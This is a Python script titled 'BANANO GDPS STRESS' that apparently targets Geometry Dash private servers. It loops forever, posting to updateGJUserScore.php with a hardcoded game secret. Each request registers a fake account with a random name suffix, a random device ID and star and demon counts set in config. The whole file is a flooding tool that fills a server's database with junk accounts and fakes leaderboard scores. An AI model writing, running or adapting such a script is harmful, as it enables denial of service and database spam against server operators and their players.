import requests
import random
from random import randint as rand
import config as cfg

print("BANANO GDPS STRESS")
print("DataBase: "+cfg.dataBase)
  
database = cfg.dataBase
userName = cfg.name
stars = cfg.stars
demons = cfg.demons


def createUser(userName, stars, demons, udid):
    
    numbers=str(random.randint(8546845, 99999999))
    color1=str(random.randint(1, 96))
    color2=str(random.randint(1, 96))
    icon=str(random.randint(1, 146))
    print('Icon info:')
    print('Icon id: '+icon)
    print('Color 1: '+color1)
    print('Color 2: '+color2)
    print('-------------------------------')
    
    endpoint = database
    data = {
        'userName': userName+' '+numbers, 
        'secret': 'Wmfv3899gc9', 
        'stars': stars, 
        'demons': demons,
        'icon': icon, 
        'color1': color1, 
        'color2': color2,
        'udid' : udid
    }
    headers = {'User-Agent': ''}
    r = requests.post(endpoint+"updateGJUserScore.php", data=data, headers=headers)
    return r.text
def generateUDID():
    udid = "S"+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(1,9))
    return udid
    
    
while True:
    print('')
    print('')
    print('User create:')
    print('ID: '+createUser(userName, stars, demons, generateUDID()))
    print("Name: "+cfg.name)
    print('Stars: '+cfg.stars)
    print('Demons: '+cfg.demons)
    print('----------------------------------')
    print('Запрос отправлен!')